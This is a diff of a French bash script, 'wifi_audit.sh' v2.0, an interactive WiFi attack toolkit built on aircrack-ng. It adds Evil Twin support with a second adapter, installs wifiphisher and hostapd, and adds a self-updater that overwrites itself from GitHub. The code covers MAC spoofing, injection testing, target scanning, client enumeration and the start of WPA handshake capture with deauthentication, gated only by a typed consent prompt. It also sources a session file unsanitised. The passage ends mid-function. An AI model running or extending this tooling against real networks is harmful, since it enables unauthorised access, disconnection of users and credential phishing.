@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 #
-# wifi_audit.sh — Script d'audit de sécurité WiFi interactif & automatisé
+# wifi_audit.sh — Script d'audit de sécurité WiFi interactif & automatisé (v2.0)
 #
 # ⚠️ AVERTISSEMENT LÉGAL ⚠️
 # Ce script ne doit être utilisé QUE sur des réseaux WiFi dont vous êtes
@@ -20,28 +20,33 @@ BLUE='\033[0;34m'
 CYAN='\033[0;36m'
 MAGENTA='\033[0;35m'
 BOLD='\033[1m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
 LOGDIR="$HOME/wifi_audit_logs/$(date +%Y%m%d_%H%M%S)"
 mkdir -p "$LOGDIR"
+SESSION_FILE="$HOME/.wifi_audit_session"
 
-# Variables globales d'état
+# Variables globales
 IFACE=""
 MONIFACE=""
+SECOND_IFACE=""  # Pour Evil Twin (2 cartes)
 TARGET_BSSID=""
 TARGET_ESSID=""
 TARGET_CH=""
 TARGET_ENC=""
 TARGET_PWR=""
 LAST_CAPFILE=""
+SELECTED_CAP=""
+SELECTED_WL=""
 SCAN_CSV_PREFIX="$LOGDIR/scan_live"
+EVIL_TWIN_PID=""
 
-# Dépendances requises
+# Dépendances
 REQUIRED_TOOLS=(iw airodump-ng airmon-ng aireplay-ng aircrack-ng macchanger)
-OPTIONAL_TOOLS=(wifite reaver pixiewps hcxdumptool hcxpcapngtool xterm)
+OPTIONAL_TOOLS=(wifite reaver pixiewps hcxdumptool hcxpcapngtool xterm hashcat hostapd dnsmasq wifiphisher kismet tshark)
 
 # ==============================
-# FONCTIONS D'AFFICHAGE & LOGS
+# FONCTIONS D'AFFICHAGE
 # ==============================
 log()  { echo -e "${BLUE}[*]${NC} $1"; }
 ok()   { echo -e "${GREEN}[+]${NC} $1"; }
@@ -54,7 +59,6 @@ pause() {
     read -rp "Appuyez sur [Entrée] pour continuer..." _
 }
 
-# Bannière et barre d'état dynamique
 draw_header() {
     clear
     echo -e "${CYAN}${BOLD}"
@@ -65,27 +69,29 @@ draw_header() {
     \ V  V / | |  _| | |    / ___ \ |_| | (_| | | |_ 
      \_/\_/  |_|_|   |_|   /_/   \_\__,_|\__,_|_|\__|
 EOF
-    echo -e "${NC}            ${YELLOW}Audit & Analyse de Sécurité Sans-Fil${NC}"
+    echo -e "${NC}            ${YELLOW}Audit & Analyse de Sécurité Sans-Fil v2.0${NC}"
     echo -e "${BLUE}========================================================================${NC}"
     
-    # État de l'interface
     if [[ -n "$MONIFACE" ]]; then
+        local current_ch
+        current_ch=$(iw dev "$MONIFACE" info 2>/dev/null | awk '/channel/{print $2}' | head -1)
         echo -e "  📡 ${BOLD}Interface:${NC} ${GREEN}$IFACE${NC} | ${BOLD}Monitor:${NC} ${GREEN}$MONIFACE (Actif)${NC}"
+        [[ -n "$current_ch" ]] && echo -e "  📻 ${BOLD}Canal actuel:${NC} ${YELLOW}$current_ch${NC}"
     elif [[ -n "$IFACE" ]]; then
         echo -e "  📡 ${BOLD}Interface:${NC} ${YELLOW}$IFACE${NC} | ${BOLD}Monitor:${NC} ${RED}Inactif${NC}"
     else
         echo -e "  📡 ${BOLD}Interface:${NC} ${RED}Non sélectionnée${NC}"
     fi
 
-    # État de la cible
     if [[ -n "$TARGET_BSSID" ]]; then
         local essid_disp="${TARGET_ESSID:-<Masqué>}"
-        echo -e "  🎯 ${BOLD}Cible Active:${NC} ${GREEN}$essid_disp${NC} [BSSID: ${CYAN}$TARGET_BSSID${NC} | Canal: ${YELLOW}$TARGET_CH${NC} | Sec: ${MAGENTA}$TARGET_ENC${NC}]"
+        echo -e "  🎯 ${BOLD}Cible:${NC} ${GREEN}$essid_disp${NC} [BSSID: ${CYAN}$TARGET_BSSID${NC} | CH: ${YELLOW}$TARGET_CH${NC} | Sec: ${MAGENTA}$TARGET_ENC${NC}]"
     else
-        echo -e "  🎯 ${BOLD}Cible Active:${NC} ${YELLOW}Aucune (Scannez et sélectionnez un réseau)${NC}"
+        echo -e "  🎯 ${BOLD}Cible:${NC} ${YELLOW}Aucune${NC}"
     fi
 
-    echo -e "  📁 ${BOLD}Session logs:${NC} $LOGDIR"
+    [[ -n "$SECOND_IFACE" ]] && echo -e "  📶 ${BOLD}2ème Interface (Evil Twin):${NC} ${GREEN}$SECOND_IFACE${NC}"
+    echo -e "  📁 ${BOLD}Logs:${NC} $LOGDIR"
     echo -e "${BLUE}========================================================================${NC}"
 }
 
@@ -102,14 +108,71 @@ check_root() {
 check_consent() {
     draw_header
     warn "AVERTISSEMENT LÉGAL :"
-    echo "Ce programme est destiné uniquement à l'audit et à l'analyse de réseaux"
-    echo "pour lesquels vous disposez d'une autorisation explicite de test."
+    echo "Ce programme est destiné UNIQUEMENT à l'audit de réseaux pour lesquels"
+    echo "vous disposez d'une autorisation EXPLICITE et ÉCRITE."
+    echo "L'utilisation sur des réseaux tiers est ILLÉGALE et passible de poursuites."
     echo ""
-    read -rp "Confirmez-vous détenir l'autorisation légale nécessaire ? (oui/non) : " CONSENT
+    read -rp "Confirmez-vous détenir l'autorisation légale ? (oui/non) : " CONSENT
     if [[ "$CONSENT" != "oui" && "$CONSENT" != "o" ]]; then
         err "Consentement non confirmé. Arrêt du programme."
         exit 1
     fi
+}
+
+# ==============================
+# MISE À JOUR AUTOMATIQUE DEPUIS GITHUB
+# ==============================
+CURRENT_VERSION="2.0"
+GITHUB_REPO="yomix90/wifi-audit-tool"
+SCRIPT_URL="https://raw.githubusercontent.com/${GITHUB_REPO}/main/wifi_audit.sh"
+
+check_update() {
+    log "Vérification des mises à jour..."
+
+    if ! command -v curl &>/dev/null; then
+        warn "curl n'est pas installé, impossible de vérifier les mises à jour en ligne."
+        return 1
+    fi
+
+    # Récupère la dernière version depuis GitHub avec un timeout
+    local remote_version
+    remote_version=$(curl -fsSL --connect-timeout 5 "$SCRIPT_URL" 2>/dev/null | grep -m1 '^CURRENT_VERSION=' | cut -d'"' -f2)
+
+    if [[ -z "$remote_version" ]]; then
+        warn "Impossible de vérifier les mises à jour (pas de connexion ou dépôt inaccessible)."
+        return 1
+    fi
+
+    log "Version locale : ${GREEN}${CURRENT_VERSION}${NC} | Version distante : ${CYAN}${remote_version}${NC}"
+
+    # Comparaison sémantique simple
+    if [[ "$(printf '%s\n' "$remote_version" "$CURRENT_VERSION" | sort -V | head -n1)" != "$remote_version" ]]; then
+        ok "🆕 Nouvelle version disponible : ${GREEN}${remote_version}${NC}"
+        read -rp "Mettre à jour automatiquement ? (o/n) : " upd_choice
+        if [[ "$upd_choice" =~ ^[oOyY]$ ]]; then
+            local script_path
+            script_path=$(readlink -f "$0")
+            local backup="${script_path}.bak.$(date +%s)"
+
+            log "Sauvegarde de l'ancienne version : $backup"
+            cp "$script_path" "$backup"
+
+            log "Téléchargement de la nouvelle version..."
+            if curl -fsSL -o "$script_path" "$SCRIPT_URL"; then
+                chmod +x "$script_path"
+                ok "✅ Mise à jour réussie vers v${remote_version} !"
+                info "L'ancienne version est sauvegardée dans : $backup"
+                info "Relancez le script pour appliquer la mise à jour."
+                exit 0
+            else
+                err "Échec du téléchargement. Restauration de la sauvegarde..."
+                mv "$backup" "$script_path"
+            fi
+        fi
+    else
+        ok "Vous avez la dernière version (v${CURRENT_VERSION})."
+    fi
+    return 0
 }
 
 check_deps() {
@@ -119,7 +182,7 @@ check_deps() {
     local missing_req=()
     local missing_opt=()
 
-    log "Vérification des outils indispensables..."
+    log "Outils indispensables :"
     for tool in "${REQUIRED_TOOLS[@]}"; do
         if command -v "$tool" &>/dev/null; then
             ok "  ✓ $tool"
@@ -130,7 +193,7 @@ check_deps() {
     done
 
     echo ""
-    log "Vérification des outils optionnels..."
+    log "Outils optionnels :"
     for tool in "${OPTIONAL_TOOLS[@]}"; do
         if command -v "$tool" &>/dev/null; then
             ok "  ✓ $tool"
@@ -142,11 +205,15 @@ check_deps() {
 
     if [[ ${#missing_req[@]} -gt 0 || ${#missing_opt[@]} -gt 0 ]]; then
         echo ""
-        read -rp "Voulez-vous tenter d'installer les outils manquants via apt ? (o/n) : " INSTALL_CHOICE
+        read -rp "Installer les outils manquants via apt ? (o/n) : " INSTALL_CHOICE
         if [[ "$INSTALL_CHOICE" =~ ^[oOyY]$ ]]; then
-            log "Mise à jour des paquets et installation..."
+            log "Installation en cours..."
             apt update
-            apt install -y aircrack-ng wifite reaver pixiewps hcxdumptool hcxtools macchanger xterm wireless-tools iw
+            apt install -y aircrack-ng wifite reaver pixiewps hcxdumptool hcxtools \
+                macchanger xterm hashcat hostapd dnsmasq wireless-tools iw \
+                iptables python3 python3-pip tshark kismet 2>/dev/null || true
+            # wifiphisher via pip
+            pip3 install wifiphisher 2>/dev/null || true
             ok "Installation terminée."
         fi
     fi
@@ -154,16 +221,44 @@ check_deps() {
 }
 
 # ==============================
+# GESTION DE SESSION
+# ==============================
+save_session() {
+    {
+        echo "IFACE=$IFACE"
+        echo "MONIFACE=$MONIFACE"
+        echo "SECOND_IFACE=$SECOND_IFACE"
+        echo "TARGET_BSSID=$TARGET_BSSID"
+        echo "TARGET_ESSID=$TARGET_ESSID"
+        echo "TARGET_CH=$TARGET_CH"
+        echo "TARGET_ENC=$TARGET_ENC"
+        echo "TARGET_PWR=$TARGET_PWR"
+        echo "LAST_CAPFILE=$LAST_CAPFILE"
+        echo "LOGDIR=$LOGDIR"
+    } > "$SESSION_FILE"
+}
+
+load_session() {
+    if [[ -f "$SESSION_FILE" ]]; then
+        read -rp "Session précédente détectée. Restaurer ? (o/n) : " restore
+        if [[ "$restore" =~ ^[oOyY]$ ]]; then
+            source "$SESSION_FILE"
+            ok "Session restaurée."
+            pause
+        fi
+    fi
+}
+
+# ==============================
 # GESTION DES INTERFACES
 # ==============================
 get_wireless_interfaces() {
-    # Récupération propre des interfaces sans fil
     iw dev 2>/dev/null | awk '$1=="Interface"{print $2}'
 }
 
 select_interface() {
     draw_header
-    echo -e "${BOLD}--- SÉLECTION DE L'INTERFACE SANS FIL ---${NC}\n"
+    echo -e "${BOLD}--- SÉLECTION DE L'INTERFACE ---${NC}\n"
     
     local ifaces=()
     while IFS= read -r iface_name; do
@@ -171,13 +266,12 @@ select_interface() {
     done < <(get_wireless_interfaces)
 
     if [[ ${#ifaces[@]} -eq 0 ]]; then
-        err "Aucune interface sans-fil détectée sur le système !"
-        info "Vérifiez que votre adaptateur WiFi est branché et supporté."
+        err "Aucune interface WiFi détectée !"
         pause
         return
     fi
 
-    echo "Interfaces sans fil disponibles :"
+    echo "Interfaces disponibles :"
     for i in "${!ifaces[@]}"; do
         local ifc="${ifaces[$i]}"
         local mac
@@ -186,142 +280,159 @@ select_interface() {
         driver=$(ethtool -i "$ifc" 2>/dev/null | awk -F': ' '$1=="driver"{print $2}' || echo "N/A")
         echo -e "  [${GREEN}$((i + 1))${NC}] ${BOLD}$ifc${NC} (MAC: $mac | Driver: $driver)"
     done
-    echo -e "  [${YELLOW}0${NC}] Retour au menu principal"
+    echo -e "  [${YELLOW}0${NC}] Retour"
     echo ""
 
-    read -rp "Sélectionnez une interface [1-${#ifaces[@]}] : " choice
+    read -rp "Sélection [1-${#ifaces[@]}] : " choice
     if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#ifaces[@]} )); then
         IFACE="${ifaces[$((choice - 1))]}"
-        # Vérifie si l'interface est déjà en mode monitor
         if iw dev "$IFACE" info 2>/dev/null | grep -q "type monitor"; then
             MONIFACE="$IFACE"
-            ok "Interface sélectionnée : $IFACE (Déjà en mode monitor)"
+            ok "Interface : $IFACE (déjà en monitor)"
         else
             MONIFACE=""
             ok "Interface sélectionnée : $IFACE"
         fi
-    elif [[ "$choice" == "0" || "$choice" == "r" ]]; then
-        return
-    else
-        err "Choix invalide."
     fi
+    save_session
+    pause
+}
+
+select_second_interface() {
+    draw_header
+    echo -e "${BOLD}--- SÉLECTION 2ÈME INTERFACE (pour Evil Twin) ---${NC}\n"
+    
+    local ifaces=()
+    while IFS= read -r iface_name; do
+        [[ "$iface_name" != "$IFACE" && -n "$iface_name" ]] && ifaces+=("$iface_name")
+    done < <(get_wireless_interfaces)
+
+    if [[ ${#ifaces[@]} -eq 0 ]]; then
+        err "Aucune 2ème interface disponible."
+        warn "Branchez un 2ème adaptateur WiFi pour Evil Twin."
+        pause
+        return
+    fi
+
+    for i in "${!ifaces[@]}"; do
+        echo -e "  [${GREEN}$((i + 1))${NC}] ${BOLD}${ifaces[$i]}${NC}"
+    done
+    echo -e "  [${YELLOW}0${NC}] Retour"
+    
+    read -rp "Choix : " c
+    if [[ "$c" =~ ^[0-9]+$ ]] && (( c >= 1 && c <= ${#ifaces[@]} )); then
+        SECOND_IFACE="${ifaces[$((c - 1))]}"
+        ok "2ème interface : $SECOND_IFACE"
+    fi
+    save_session
     pause
 }
 
 enable_monitor() {
     draw_header
-    echo -e "${BOLD}--- ACTIVATION DU MODE MONITOR ---${NC}\n"
+    echo -e "${BOLD}--- ACTIVATION MODE MONITOR ---${NC}\n"
 
     if [[ -z "$IFACE" ]]; then
-        warn "Aucune interface sélectionnée. Sélection automatique..."
         select_interface
         [[ -z "$IFACE" ]] && return
     fi
 
-    log "Nettoyage des processus réseau conflictuels (airmon-ng check kill)..."
+    log "Nettoyage (airmon-ng check kill)..."
     airmon-ng check kill > "$LOGDIR/airmon_kill.log" 2>&1 || true
 
-    log "Activation du mode monitor sur $IFACE..."
+    log "Activation sur $IFACE..."
     airmon-ng start "$IFACE" > "$LOGDIR/airmon_start.log" 2>&1
 
-    # Détection intelligente de l'interface monitor créée
-    local detected_mon=""
+    local detected_mon
     detected_mon=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | grep -E "${IFACE}mon|mon[0-9]|${IFACE}" | head -n1)
 
     if [[ -n "$detected_mon" ]] && iw dev "$detected_mon" info 2>/dev/null | grep -q "type monitor"; then
         MONIFACE="$detected_mon"
-        ok "Mode monitor activé avec succès sur : ${GREEN}$MONIFACE${NC}"
+        ok "Mode monitor actif sur : ${GREEN}$MONIFACE${NC}"
     else
-        # Tentative manuelle iw
         ip link set "$IFACE" down 2>/dev/null || true
         iw "$IFACE" set type monitor 2>/dev/null || true
         ip link set "$IFACE" up 2>/dev/null || true
         if iw dev "$IFACE" info 2>/dev/null | grep -q "type monitor"; then
             MONIFACE="$IFACE"
-            ok "Mode monitor activé via iw sur : ${GREEN}$MONIFACE${NC}"
+            ok "Mode monitor via iw sur : ${GREEN}$MONIFACE${NC}"
         else
-            err "Échec de l'activation du mode monitor sur $IFACE."
+            err "Échec activation monitor."
         fi
     fi
+    save_session
     pause
 }
 
 disable_monitor() {
     draw_header
-    echo -e "${BOLD}--- DÉSACTIVATION DU MODE MONITOR ---${NC}\n"
-
-    local target_to_stop="${MONIFACE:-$IFACE}"
-    if [[ -n "$target_to_stop" ]]; then
-        log "Arrêt du mode monitor sur $target_to_stop..."
-        airmon-ng stop "$target_to_stop" > "$LOGDIR/airmon_stop.log" 2>&1 || true
+    log "Arrêt mode monitor..."
+    local target="${MONIFACE:-$IFACE}"
+    if [[ -n "$target" ]]; then
+        airmon-ng stop "$target" > "$LOGDIR/airmon_stop.log" 2>&1 || true
         ip link set "$IFACE" down 2>/dev/null || true
         iw "$IFACE" set type managed 2>/dev/null || true
         ip link set "$IFACE" up 2>/dev/null || true
     fi
-
     MONIFACE=""
-    log "Redémarrage des services réseau (NetworkManager / wpa_supplicant)..."
+    log "Redémarrage NetworkManager / wpa_supplicant..."
     systemctl restart NetworkManager 2>/dev/null || service NetworkManager restart 2>/dev/null || true
-    ok "Mode monitor désactivé et services réseau restaurés."
+    systemctl restart wpa_supplicant 2>/dev/null || true
+    ok "Système restauré."
+    save_session
     pause
 }
 
 change_mac() {
     draw_header
-    echo -e "${BOLD}--- GESTION DE L'ADRESSE MAC ---${NC}\n"
+    echo -e "${BOLD}--- GESTION MAC ---${NC}\n"
+    [[ -z "$IFACE" ]] && { warn "Sélectionnez d'abord une interface."; pause; return; }
 
-    local current_iface="${IFACE:-}"
-    if [[ -z "$current_iface" ]]; then
-        warn "Veuillez d'abord sélectionner une interface."
-        pause
-        return
-    fi
-
-    echo "1) Générer une adresse MAC aléatoire"
-    echo "2) Spécifier une adresse MAC personnalisée"
-    echo "3) Restaurer l'adresse MAC d'origine"
+    echo "1) MAC aléatoire"
+    echo "2) MAC personnalisée"
+    echo "3) Restaurer MAC d'origine"
     echo "0) Annuler"
-    echo ""
-    read -rp "Choix : " mac_opt
+    read -rp "Choix : " opt
 
-    case "$mac_opt" in
-        1)
-            ip link set "$current_iface" down
-            macchanger -r "$current_iface" | tee "$LOGDIR/mac_change.log"
-            ip link set "$current_iface" up
-            ok "Nouvelle adresse MAC aléatoire appliquée !"
-            ;;
-        2)
-            read -rp "Entrez la MAC voulue (ex: 00:11:22:33:44:55) : " custom_mac
-            if [[ "$custom_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-                ip link set "$current_iface" down
-                macchanger -m "$custom_mac" "$current_iface" | tee "$LOGDIR/mac_change.log"
-                ip link set "$current_iface" up
-                ok "Adresse MAC personnalisée appliquée !"
-            else
-                err "Format MAC invalide."
-            fi
-            ;;
-        3)
-            ip link set "$current_iface" down
-            macchanger -p "$current_iface" | tee "$LOGDIR/mac_change.log"
-            ip link set "$current_iface" up
-            ok "Adresse MAC permanente restaurée."
-            ;;
-        *)
-            return
-            ;;
+    case "$opt" in
+        1) ip link set "$IFACE" down; macchanger -r "$IFACE" | tee "$LOGDIR/mac.log"; ip link set "$IFACE" up ;;
+        2) read -rp "MAC (00:11:22:33:44:55) : " cm
+           if [[ "$cm" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+               ip link set "$IFACE" down; macchanger -m "$cm" "$IFACE" | tee "$LOGDIR/mac.log"; ip link set "$IFACE" up
+           else err "Format invalide."; fi ;;
+        3) ip link set "$IFACE" down; macchanger -p "$IFACE" | tee "$LOGDIR/mac.log"; ip link set "$IFACE" up ;;
     esac
     pause
 }
 
+test_injection() {
+    ensure_monitor_active || return
+    draw_header
+    log "Test d'injection sur $MONIFACE (~10s)..."
+    info "Vérification compatibilité carte/driver..."
+    
+    local result
+    if result=$(aireplay-ng --test "$MONIFACE" 2>&1); then
+        echo "$result" | tee "$LOGDIR/injection_test.log"
+        if echo "$result" | grep -q "Injection is working"; then
+            ok "✓ Injection fonctionnelle !"
+        else
+            warn "Résultat partiel - vérifier le log."
+        fi
+    else
+        err "✗ ÉCHEC : Votre carte ne supporte pas l'injection."
+        warn "Les déauths échoueront. Essayez un autre driver/carte."
+    fi
+    pause
+}
+
 # ==============================
-# SCAN & SÉLECTION AUTOMATIQUE
+# SCAN & SÉLECTION
 # ==============================
 ensure_monitor_active() {
     if [[ -z "$MONIFACE" ]]; then
-        warn "Le mode monitor n'est pas activé."
-        read -rp "Voulez-vous l'activer maintenant ? (o/n) : " opt
+        warn "Mode monitor non activé."
+        read -rp "Activer maintenant ? (o/n) : " opt
         if [[ "$opt" =~ ^[oOyY]$ ]]; then
             enable_monitor
         else
@@ -333,185 +444,123 @@ ensure_monitor_active() {
 
 scan_and_select_target() {
     ensure_monitor_active || return
-
     draw_header
-    echo -e "${BOLD}--- SCAN ET SÉLECTION AUTOMATIQUE DU RÉSEAU CIBLE ---${NC}\n"
-    echo "Choisissez le mode de scan :"
-    echo "  [1] Scan rapide chronométré (15 secondes)"
-    echo "  [2] Scan complet chronométré (30 secondes)"
-    echo "  [3] Scan interactif continu (Arrêt avec Ctrl+C quand vous voulez)"
+    echo -e "${BOLD}--- SCAN WIFI ---${NC}\n"
+    echo "  [1] Scan rapide (15s)"
+    echo "  [2] Scan complet (30s)"
+    echo "  [3] Scan interactif (Ctrl+C pour arrêter)"
     echo "  [0] Annuler"
-    echo ""
-    read -rp "Votre choix [1-3] : " scan_mode
+    read -rp "Choix : " scan_mode
 
     local scan_duration=0
     case "$scan_mode" in
         1) scan_duration=15 ;;
         2) scan_duration=30 ;;
         3) scan_duration=0 ;;
-        0|r) return ;;
-        *) err "Choix invalide"; pause; return ;;
+        0) return ;;
+        *) err "Invalide"; pause; return ;;
     esac
 
-    # Nettoyage des anciens scans
     rm -f "${SCAN_CSV_PREFIX}"*
 
-    log "Lancement d'airodump-ng sur ${GREEN}$MONIFACE${NC}..."
+    log "Scan en cours..."
     if [[ $scan_duration -gt 0 ]]; then
-        info "Scan en cours pendant $scan_duration secondes... Patientez..."
         timeout --foreground "$scan_duration" airodump-ng "$MONIFACE" \
             --write "$SCAN_CSV_PREFIX" --output-format csv >/dev/null 2>&1 || true
     else
-        info "Scan en direct. Appuyez sur [Ctrl+C] dès que votre cible apparaît dans la liste."
+        info "Ctrl+C pour arrêter."
         sleep 2
         airodump-ng "$MONIFACE" --write "$SCAN_CSV_PREFIX" --output-format csv || true
     fi
 
     local csv_file="${SCAN_CSV_PREFIX}-01.csv"
     if [[ ! -f "$csv_file" ]]; then
-        err "Aucun résultat de scan disponible."
-        pause
-        return
+        err "Aucun résultat."; pause; return
     fi
 
-    # Parsing du CSV airodump-ng
-    # Format airodump CSV AP section : BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
-    local ap_list=()
-    local bssids=()
-    local channels=()
-    local privacies=()
-    local powers=()
-    local essids=()
-
-    local in_ap_section=true
-    while IFS=, read -r bssid ftime ltime ch speed priv cipher auth pwr beacons iv lan idlen essid key || [[ -n "$bssid" ]]; do
-        # Nettoyage des espaces et retours chariot
-        bssid=$(echo "$bssid" | tr -d ' \r\n"')
-        ch=$(echo "$ch" | tr -d ' \r\n"')
-        priv=$(echo "$priv" | tr -d ' \r\n"')
-        pwr=$(echo "$pwr" | tr -d ' \r\n"')
-        essid=$(echo "$essid" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' -e 's/\r//g' -e 's/"//g')
-
-        # Détection du passage à la section Clients
-        if [[ "$bssid" == "StationMAC" ]]; then
-            in_ap_section=false
-            break
+    # Parsing robuste avec awk
+    local bssids=() channels=() privacies=() powers=() essids=()
+    local in_ap=true
+    
+    while IFS= read -r line; do
+        [[ -z "$line" || "$line" == "BSSID"* ]] && continue
+        if [[ "$line" == "Station MAC"* ]]; then
+            in_ap=false; break
         fi
-
-        # Filtre les en-têtes et lignes non BSSID
-        if [[ "$in_ap_section" == true && "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-            bssids+=("$bssid")
-            channels+=("$ch")
-            privacies+=("$priv")
-            powers+=("$pwr")
-            essids+=("${essid:-<Masqué>}")
+        if [[ "$in_ap" == true ]]; then
+            local bssid ch priv pwr essid
+            bssid=$(echo "$line" | awk -F', ' '{print $1}' | tr -d ' ')
+            ch=$(echo "$line" | awk -F', ' '{print $4}' | tr -d ' ')
+            priv=$(echo "$line" | awk -F', ' '{print $6}' | tr -d ' ')
+            pwr=$(echo "$line" | awk -F', ' '{print $9}' | tr -d ' ')
+            essid=$(echo "$line" | cut -d',' -f14- | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' -e 's/"//g')
+            
+            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+                bssids+=("$bssid")
+                channels+=("$ch")
+                privacies+=("$priv")
+                powers+=("$pwr")
+                essids+=("${essid:-<Masqué>}")
+            fi
         fi
     done < "$csv_file"
 
-    local total_aps=${#bssids[@]}
-    if [[ $total_aps -eq 0 ]]; then
-        warn "Aucun point d'accès n'a été détecté lors de ce scan."
-        pause
-        return
+    local total=${#bssids[@]}
+    if [[ $total -eq 0 ]]; then
+        warn "Aucun AP détecté."; pause; return
     fi
 
     draw_header
-    echo -e "${BOLD}--- RÉSEAUX WIFI DÉTECTÉS ($total_aps) ---${NC}\n"
-    printf "${BOLD}%-5s %-19s %-5s %-6s %-14s %-25s${NC}\n" "NUM" "BSSID" "CH" "PWR" "SÉCURITÉ" "ESSID"
-    echo "------------------------------------------------------------------------"
-
+    printf "${BOLD}%-4s %-19s %-4s %-6s %-12s %-25s${NC}\n" "N°" "BSSID" "CH" "PWR" "SEC" "ESSID"
+    echo "-----------------------------------------------------------------------"
     for i in "${!bssids[@]}"; do
         local num=$((i + 1))
-        local b="${bssids[$i]}"
-        local c="${channels[$i]}"
         local p="${powers[$i]}"
-        local sec="${privacies[$i]}"
-        local e="${essids[$i]}"
-        
-        # Coloration selon la puissance du signal
-        local pwr_col="$GREEN"
-        if [[ "$p" -lt -75 ]]; then
-            pwr_col="$RED"
-        elif [[ "$p" -lt -60 ]]; then
-            pwr_col="$YELLOW"
-        fi
-
-        printf "[%2d]  %-19s %-5s ${pwr_col}%-6s${NC} %-14s ${BOLD}%-25s${NC}\n" \
-            "$num" "$b" "$c" "$p" "$sec" "$e"
+        local pc="$GREEN"
+        [[ "$p" -lt -75 ]] && pc="$RED"
+        [[ "$p" -lt -60 && "$p" -ge -75 ]] && pc="$YELLOW"
+        printf "[%2d] %-19s %-4s ${pc}%-6s${NC} %-12s ${BOLD}%-25s${NC}\n" \
+            "$num" "${bssids[$i]}" "${channels[$i]}" "$p" "${privacies[$i]}" "${essids[$i]}"
     done
-
-    echo "------------------------------------------------------------------------"
-    echo -e "  [${YELLOW}0${NC}] Annuler et revenir au menu"
-    echo ""
-
-    read -rp "Sélectionnez le numéro du réseau cible [1-$total_aps] : " ap_choice
-    if [[ "$ap_choice" =~ ^[0-9]+$ ]] && (( ap_choice >= 1 && ap_choice <= total_aps )); then
+    echo "-----------------------------------------------------------------------"
+    read -rp "Sélection [1-$total] : " ap_choice
+    
+    if [[ "$ap_choice" =~ ^[0-9]+$ ]] && (( ap_choice >= 1 && ap_choice <= total )); then
         local idx=$((ap_choice - 1))
         TARGET_BSSID="${bssids[$idx]}"
         TARGET_CH="${channels[$idx]}"
         TARGET_ENC="${privacies[$idx]}"
         TARGET_PWR="${powers[$idx]}"
         TARGET_ESSID="${essids[$idx]}"
-
-        ok "Cible enregistrée avec succès !"
-        echo -e "  ESSID    : ${GREEN}$TARGET_ESSID${NC}"
-        echo -e "  BSSID    : ${CYAN}$TARGET_BSSID${NC}"
-        echo -e "  Canal    : ${YELLOW}$TARGET_CH${NC}"
-        echo -e "  Sécurité : ${MAGENTA}$TARGET_ENC${NC}"
-    else
-        info "Sélection annulée."
+        ok "Cible : $TARGET_ESSID ($TARGET_BSSID)"
+        save_session
     fi
     pause
 }
 
-# ==============================
-# SÉLECTION DES CLIENTS CONNECTÉS
-# ==============================
 get_target_clients() {
-    local csv_file="${SCAN_CSV_PREFIX}-01.csv"
-    local clients=()
-
-    if [[ ! -f "$csv_file" ]]; then
-        return
-    fi
-
-    local in_clients_section=false
+    local csv="${SCAN_CSV_PREFIX}-01.csv"
+    [[ ! -f "$csv" ]] && return
+    local in_clients=false
     while IFS=, read -r c_mac ftime ltime pwr packets bssid_assoc probed || [[ -n "$c_mac" ]]; do
         c_mac=$(echo "$c_mac" | tr -d ' \r\n"')
         bssid_assoc=$(echo "$bssid_assoc" | tr -d ' \r\n"')
-        pwr=$(echo "$pwr" | tr -d ' \r\n"')
-        packets=$(echo "$packets" | tr -d ' \r\n"')
-
-        if [[ "$c_mac" == "StationMAC" ]]; then
-            in_clients_section=true
-            continue
+        if [[ "$c_mac" == "StationMAC" ]]; then in_clients=true; continue; fi
+        if [[ "$in_clients" == true && "$bssid_assoc" == "$TARGET_BSSID" ]]; then
+            echo "$c_mac (Pwr: ${pwr}, Pkts: $packets)"
         fi
-
-        if [[ "$in_clients_section" == true && "$c_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-            if [[ "$bssid_assoc" == "$TARGET_BSSID" ]]; then
-                clients+=("$c_mac (Signal: ${pwr}dBm, Paquets: $packets)")
-            fi
-        fi
-    done < "$csv_file"
-
-    for c in "${clients[@]}"; do
-        echo "$c"
-    done
+    done < "$csv"
 }
 
 # ==============================
-# ATTAQUES & CAPTURES
+# ATTAQUES CLASSIQUES
 # ==============================
 ensure_target_selected() {
-    if [[ -z "$TARGET_BSSID" || -z "$TARGET_CH" ]]; then
-        warn "Aucun réseau cible n'est sélectionné."
-        read -rp "Voulez-vous scanner et sélectionner un réseau maintenant ? (o/n) : " opt
-        if [[ "$opt" =~ ^[oOyY]$ ]]; then
-            scan_and_select_target
-            [[ -z "$TARGET_BSSID" ]] && return 1
-        else
-            return 1
-        fi
+    if [[ -z "$TARGET_BSSID" ]]; then
+        warn "Aucune cible sélectionnée."
+        read -rp "Scanner maintenant ? (o/n) : " opt
+        [[ "$opt" =~ ^[oOyY]$ ]] && scan_and_select_target
+        [[ -z "$TARGET_BSSID" ]] && return 1
     fi
     return 0
 }
@@ -521,11 +570,9 @@ capture_handshake() {
     ensure_target_selected || return
 
     draw_header
-    echo -e "${BOLD}--- CAPTURE DE HANDSHAKE WPA/WPA2 (AVEC DÉAUTHENTIFICATION) ---${NC}\n"
-    echo -e "Cible : ${GREEN}$TARGET_ESSID${NC} (${CYAN}$TARGET_BSSID${NC}) sur le canal ${YELLOW}$TARGET_CH${NC}"
-    echo ""
-
-    # Détection des clients associés
+    echo -e "${BOLD}--- CAPTURE HANDSHAKE WPA/WPA2 ---${NC}\n"
+    echo -e "Cible : ${GREEN}$TARGET_ESSID${NC} (${CYAN}$TARGET_BSSID${NC}) CH: ${YELLOW}$TARGET_CH${NC}"
+    
     local client_list=()
     while IFS= read -r line; do
         [[ -n "$line" ]] && client_list+=("$line")
@@ -533,119 +580,89 @@ capture_handshake() {
 
     local target_client=""
     if [[ ${#client_list[@]} -gt 0 ]]; then
